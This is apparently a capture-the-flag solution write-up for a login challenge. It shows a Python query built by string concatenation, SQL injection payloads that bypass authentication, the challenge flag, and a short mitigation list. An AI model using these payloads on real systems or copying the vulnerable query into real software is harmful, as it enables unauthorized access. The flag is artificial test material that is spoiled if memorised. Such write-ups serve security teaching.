# Challenge 02: LoginBypass - Solution

## Vulnerability Type
**SQL Injection (SQLi)**

## Description
The application uses string concatenation to build SQL queries without proper sanitization, making it vulnerable to SQL injection attacks.

## Vulnerable Code
```python
query = f"SELECT * FROM users WHERE username='{u}' AND password='{hashlib.md5(p.encode()).hexdigest()}'"
```

## Exploitation Steps

1. Navigate to the login page
2. In the username field, enter: `admin' OR '1'='1' --`
3. In the password field, enter anything (e.g., `password`)
4. The resulting SQL query becomes:
   ```sql
   SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...'
   ```
5. The `--` comments out the rest of the query, and `'1'='1'` is always true
6. This bypasses authentication and logs you in as the first user (alice, who is admin)

## Alternative Payload
```
Username: alice' --
Password: (anything)
```

## Flag
```
FCTF{sql1_1s_0ld_but_g0ld}
```

## Mitigation
- Use parameterized queries/prepared statements
- Never concatenate user input directly into SQL queries
- Implement input validation and sanitization
- Use an ORM framework
